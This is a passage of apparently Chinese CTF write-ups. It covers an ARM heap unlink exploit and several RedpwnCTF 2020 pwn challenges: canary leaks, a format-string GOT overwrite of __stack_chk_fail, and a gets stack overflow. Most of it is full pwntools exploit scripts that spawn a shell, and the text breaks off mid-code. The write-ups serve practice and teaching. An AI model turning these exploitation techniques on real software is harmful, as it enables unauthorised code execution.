class="string">&quot;./libuClibc-1.0.34.so&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p><strong>模版使用</strong></p><ul><li>python exp.py r 打远程</li><li>python exp.py l 本地测试</li><li>python exp.py d/a/b/… 用于本地调试, exp 启动后新启一个终端, 使用 <strong>gdb-multiarch</strong> 就可以通过 <strong>target remote localhost:1234</strong> 来进行调试了</li></ul></blockquote><p>远程和本地跟一个后缀就行了，本地调试参数不是 r &amp; l 即可。开启本地调试，依次执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 终端1</span></span><br><span class="line">python exp.py d</span><br><span class="line"><span class="meta">#</span><span class="bash"> 终端2</span></span><br><span class="line">gdb-multiarch</span><br><span class="line">target remote localhost:1234</span><br><span class="line"><span class="meta">#</span><span class="bash"> 输入c开始运行程序</span></span><br></pre></td></tr></table></figure><p>打断点，我是在终端 2 中直接打断点，没有在 exp 中用 gdb.attach() 。还有一个问题就是 gdb 不能直接查堆，即使已经装完几个库文件：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3NreWVkYWk5MTAvUGljYmVkL2ltZy8yMDIwMDYyNjAwMjQyNi5wbmc?x-oss-process=image/format,png"></p><p>最后是通过找存放堆指针地址的数组（0x002106C）查堆空间。</p><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><h4 id="保护情况-1"><a href="#保护情况-1" class="headerlink" title="保护情况"></a>保护情况</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     arm-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x10000)</span><br></pre></td></tr></table></figure><h4 id="漏洞函数-1"><a href="#漏洞函数-1" class="headerlink" title="漏洞函数"></a>漏洞函数</h4><p>Change 功能没有对输入的长度进行限制；写入全部数据后，还会在最后加一个 \x00 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mychange</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v0; <span class="comment">// [sp+4h] [bp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [sp+Ch] [bp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [sp+14h] [bp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+18h] [bp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+1Ch] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( chunk_num )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, (<span class="keyword">int</span>)&amp;v1, <span class="number">8</span>);</span><br><span class="line">    v4 = atoi(&amp;v1);</span><br><span class="line">    <span class="keyword">if</span> ( chunk_list[<span class="number">2</span> * v4] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Length:&quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, (<span class="keyword">int</span>)&amp;v0, <span class="number">8</span>);</span><br><span class="line">      v3 = atoi(&amp;v0);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Tag:&quot;</span>);</span><br><span class="line">      v2 = read(<span class="number">0</span>, chunk_list[<span class="number">2</span> * v4], v3);     <span class="comment">// 堆溢出</span></span><br><span class="line">      *(_BYTE *)(chunk_list[<span class="number">2</span> * v4] + v2) = <span class="number">0</span>;  <span class="comment">// offbynull</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>布置堆，3 号堆用来最后传参 /bin/sh</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#3</span></span><br></pre></td></tr></table></figure><p>在 0 号堆布置一个 fake chunk ，fd&amp;bk 分别是 目标地址-12 和 目标地址-8 ，并溢出修改 1 号堆的 prev_size 和 PREV_INUSE 等等与 fake chunk 合并。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(<span class="number">0</span>)+p32(<span class="number">0x11</span>)+p32(target-<span class="number">12</span>)+p32(target-<span class="number">8</span>)</span><br><span class="line">payload += p32(<span class="number">0x10</span>)+p32(<span class="number">0x88</span>)</span><br><span class="line">change(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">remove(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>之后数组中的 0 号堆指针指向 目标地址-8 ：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9tcnNreWUuY24tZ2QudWZpbGVvcy5jb20vaW1nLzIwMjAtMDYtMjYtMnREUTFNUWo0eFg3T3ZoTi5wbmc?x-oss-process=image/format,png"></p><p>show 功能是从数组上找堆地址，然后在输出堆内容，所以往数组上写 got 表地址，覆盖堆指针，泄露 libc 地址。同时写入需要修改的函数 got 表地址，用 Change 修改（原理和 show 一样）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])*<span class="number">5</span>+p32(elf.got[<span class="string">&#x27;free&#x27;</span>])*<span class="number">4</span></span><br><span class="line">change(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">show()</span><br><span class="line">……</span><br><span class="line">change(<span class="number">2</span>,<span class="number">4</span>,p32(system))</span><br><span class="line">remove(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><blockquote><p>来自师兄的exp，我删了多余的堆，和调整了一下填充内容。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @File    : exp.py</span></span><br><span class="line"><span class="comment"># @Author  : hope</span></span><br><span class="line"><span class="comment"># @site    : https://hop11.github.io/</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.binary = <span class="string">&quot;a.out&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    sh = remote(<span class="string">&quot;remote_addr&quot;</span>, remote_port)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    sh = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabi&quot;</span>, <span class="string">&quot;a.out&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabi&quot;</span>, <span class="string">&quot;a.out&quot;</span>])</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;a.out&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/usr/arm-linux-gnueabi/lib/libc.so.6&quot;)</span></span><br><span class="line"><span class="comment"># 本地 libc</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libuClibc-1.0.34.so&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">length,content=<span class="string">&#x27;a&#x27;</span></span>):</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Length:&quot;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Tag:&quot;</span>)</span><br><span class="line">sh.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">index,length,content</span>):</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Length:&quot;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Tag:&quot;</span>)</span><br><span class="line">sh.send(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span>(<span class="params">index</span>):</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Tag:&quot;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="comment"># 堆数组地址</span></span><br><span class="line">target = <span class="number">0x002106C</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#0 溢出</span></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#1 被溢出</span></span><br><span class="line">add(<span class="number">0x10</span>)<span class="comment">#2 用来修改函数</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#3 传参</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># unlink</span></span><br><span class="line">payload = p32(<span class="number">0</span>)+p32(<span class="number">0x11</span>)+p32(target-<span class="number">12</span>)+p32(target-<span class="number">8</span>)</span><br><span class="line">payload += p32(<span class="number">0x10</span>)+p32(<span class="number">0x88</span>)</span><br><span class="line">change(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">payload = p32(<span class="number">0x0</span>)*<span class="number">3</span>+p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">0x0</span>)*<span class="number">3</span>+p32(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">change(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">&quot;0 : &quot;</span>)</span><br><span class="line"></span><br><span class="line">puts = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;puts:&#x27;</span>+<span class="built_in">hex</span>(puts)</span><br><span class="line">libc_base = puts - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system:&#x27;</span>+<span class="built_in">hex</span>(system)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite free</span></span><br><span class="line">change(<span class="number">2</span>,<span class="number">4</span>,p32(system))</span><br><span class="line">remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 第五空间 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 RedpwnCTF Writeup</title>
      <link href="archives/18e23abd/"/>
      <url>archives/18e23abd/</url>
      
        <content type="html"><![CDATA[<h2 id="skywriting"><a href="#skywriting" class="headerlink" title="skywriting"></a>skywriting</h2><p>简单 canary 保护绕过，复盘连不上官方环境，exp 本地版本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : skywriting.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./skywriting&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./skywriting&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;sky?&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;shot: &quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x88</span>+<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">0x88</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">8</span>))-<span class="number">0x2d</span></span><br><span class="line">log.info(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;shot: &quot;</span>,<span class="string">&quot;a&quot;</span>*(<span class="number">0x7fffffffdca8</span>-<span class="number">0x7fffffffdc10</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;a&quot;</span>*(<span class="number">0x7fffffffdca8</span>-<span class="number">0x7fffffffdc10</span>))</span><br><span class="line">libc_start_main = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;libc_start_main:&quot;</span>+<span class="built_in">hex</span>(libc_start_main))</span><br><span class="line">libc_base = libc_start_main - <span class="number">0x20830</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">onegadget = libc_base + <span class="number">0xf1147</span></span><br><span class="line">log.info(<span class="string">&quot;onegadget:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;notflag&#123;a_cloud_is_just_someone_elses_computer&#125;\n\x00&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(canary) + p64(canary) + p64(onegadget)</span><br><span class="line">p.sendafter(<span class="string">&quot;shot: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="dead-canary"><a href="#dead-canary" class="headerlink" title="dead-canary"></a>dead-canary</h2><p>一开始做的时候没有想到可以覆盖 __stack_chk_fail  got 表地址，一心想着绕过 canary ，然后就困惑着怎么 ROP 。</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>通过故意破坏 canary 的值触发程序执行 __stack_chk_fail ，而这个函数 got 函数已知，在触发之前将这个函数覆盖为 main 函数，完成 ROP 。</p><p>在第一轮输入的时候：泄露 __libc_start_main ；泄露 canary ；改写 __stack_chk_fail got 表为 main 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;%41$p%39$p%40$p&quot;</span> + <span class="string">&quot;%4196117c%10$n--&gt;&quot;</span></span><br><span class="line">payload += p64(elf.got[<span class="string">&quot;__stack_chk_fail&quot;</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0x110</span>-<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += <span class="string">&#x27;\x2d&#x27;</span></span><br></pre></td></tr></table></figure><p>第二轮输入时候恢复 canary 、控制 rip 为 onegadget 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;skye&#x27;</span> + <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x110</span>-<span class="number">8</span>-<span class="number">4</span>) + p64(canary)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>) + p64(onegadget)</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : dead-canary.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./dead-canary&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./dead-canary&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%41$p%39$p&lt;&gt;&quot;</span> + <span class="string">&quot;%4196117c%10$n-----&gt;&quot;</span></span><br><span class="line">payload += p64(elf.got[<span class="string">&quot;__stack_chk_fail&quot;</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">0x110</span>-<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += <span class="string">&#x27;\x2d&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name: &quot;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x4007F3&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello &quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_start_main = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;libc_start_main:&quot;</span>+<span class="built_in">hex</span>(libc_start_main))</span><br><span class="line">canary = <span class="built_in">int</span>(p.recv(<span class="number">18</span>),<span class="number">16</span>) - <span class="number">0x2d</span></span><br><span class="line">log.info(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">libc_base = libc_start_main - <span class="number">0x20830</span></span><br><span class="line">log.info(<span class="string">&quot;canary:&quot;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">onegadget = libc_base + <span class="number">0x45216</span></span><br><span class="line">log.info(<span class="string">&quot;onegadget:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;skye&#x27;</span> + <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x110</span>-<span class="number">8</span>-<span class="number">4</span>) + p64(canary)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>) + p64(onegadget)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name: &quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>ctftime 上看到外国小哥最后 getshell 有用 stack pivoting 。emmm 还得搞个 rbp 算偏移 emmm</p><h2 id="coffer-overflow-0"><a href="#coffer-overflow-0" class="headerlink" title="coffer-overflow-0"></a>coffer-overflow-0</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="保护情况"><a href="#保护情况" class="headerlink" title="保护情况"></a>保护情况</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h4 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h4><p>题目给了程序源代码，但是我们还是按照正常题目做法分析二进制文件。</p><p>漏洞就在 main 中，gets 函数存在栈溢出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to coffer overflow, where our coffers are overfilling with bytes ;)&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want to fill your coffer with?&quot;</span>);</span><br><span class="line">  gets(&amp;v4, <span class="number">0LL</span>);                               <span class="comment">// 栈溢出</span></span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main 函数中在存在着 <code>system(&quot;/bin/sh&quot;)</code> 的后门函数。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>程序用 gets 函数存在栈溢出漏洞，而进入后门函数需要判断 v5 的布尔值。这里就有两种做法，一种利用栈溢出修改栈上变量 v5 的值，从而让程序正常进入 后门函数 ；第二种就是栈溢出修改 rip 的返回地址到 <code>system(&quot;/bin/sh&quot;)</code>  。两种做法都可行，我采用第一种。</p><p>首先就是确定 v5 变量在栈上的位置。可以从 IDA 变量后面的注释去分析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">__int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br></pre></td></tr></table></figure><p>v4 距离 rbp 0x20 ；v5 距离 rbp 0x8；那么可以得出 v4 距离 v5 0x16(0x20-0x8)。</p><p>确定填充长度之后就是填充内容了，if 条件检查的是 v5 的布尔值，那么就赋值一个 1 即可条件成立，进入后门函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 